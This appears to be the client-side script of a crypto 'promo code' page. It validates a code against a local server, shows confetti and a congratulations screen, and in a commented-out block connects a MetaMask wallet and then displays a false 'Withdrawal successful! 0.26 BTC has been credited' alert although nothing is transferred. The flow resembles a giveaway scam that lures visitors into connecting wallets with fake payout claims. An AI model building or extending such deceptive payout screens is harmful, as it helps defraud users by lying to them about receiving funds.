/* scripts.js */

document.getElementById('submit-code').addEventListener('click', async () => {
    const code = document.getElementById('promo-code').value;
    const walletAddress = 'user_wallet_address'; // Placeholder, replace with actual retrieval logic
    const response = await fetch('http://localhost:3000/validate-code', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ code, walletAddress })
    });
    const result = await response.json();
    if (result.success) {
        showCongratsAnimation();
        setTimeout(() => {
            document.getElementById('code-section').style.display = 'none';
            document.getElementById('congrats-section').style.display = 'block';
        }, 2000); // Delay to show the animation before revealing the wallet connection section
    } else {
        alert(result.message);
    }
});

/*document.getElementById('connect-wallet').addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            console.log('Connected account:', accounts[0]);
            document.getElementById('wallet-section').style.display = 'none';
            document.getElementById('code-section').style.display = 'block';
        } catch (error) {
            console.error('Error connecting to wallet:', error);
        }
    } else {
        alert('MetaMask not detected. Please install MetaMask.');
    }
});

document.getElementById('connect-wallet').addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            console.log('Connected account:', accounts[0]);
            alert('Withdrawal successful! 0.26 BTC has been credited to your wallet.');
        } catch (error) {
            if (error.code === 4001) {
                // EIP-1193 userRejectedRequest error
                console.error('User rejected the request.');
                alert('Connection request was rejected. Please try again.');
            } else {
                console.error('Error connecting to wallet:', error);
                alert('There was an error connecting to your wallet. Please try again.');
            }
        }
    } else {
        alert('MetaMask not detected. Please install MetaMask.');
    }
});*/

function showCongratsAnimation() {
    confetti({
        particleCount: 1000,
        spread: 70,
        origin: { y: 0.6 }
    });
}